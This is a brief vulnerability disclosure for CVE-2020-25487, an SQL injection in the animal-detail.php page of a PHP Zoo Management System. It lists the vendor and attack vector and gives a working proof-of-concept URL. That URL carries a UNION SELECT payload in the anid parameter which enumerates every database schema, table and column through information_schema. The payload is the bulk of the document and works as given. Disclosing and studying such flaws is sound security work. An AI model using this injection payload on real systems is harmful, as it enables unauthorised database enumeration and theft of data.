# CVE-2020-25487

#SQL injection Vulnerability in Zoo Management System V 1.0

#Vendor - https://phpgurukul.com

#Product - https://phpgurukul.com/zoo-management-system-using-php-and-mysql/

#Vulnerability Type - SQL injection

#Affected Component - zms/animal-detail.php

#Attack Type- Local

#Impact Code execution - true

#Attack Vectors - Go to client webpage and do sql injection at http://<site>/details.php?anid=
  
#Proof :

http://localhost/zms/animal-detail.php?anid=9%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,(select (@a) from(select(@a:=0x00),(select (@a) from(information_schema.columns)wheretable_schema!='information_schema' and(@a)in(@a:=concat(@a,table_schema,' > ',table_name,' >',column_name,'<br>'))))a),NULL,NULL,NULL,NULL--%20-
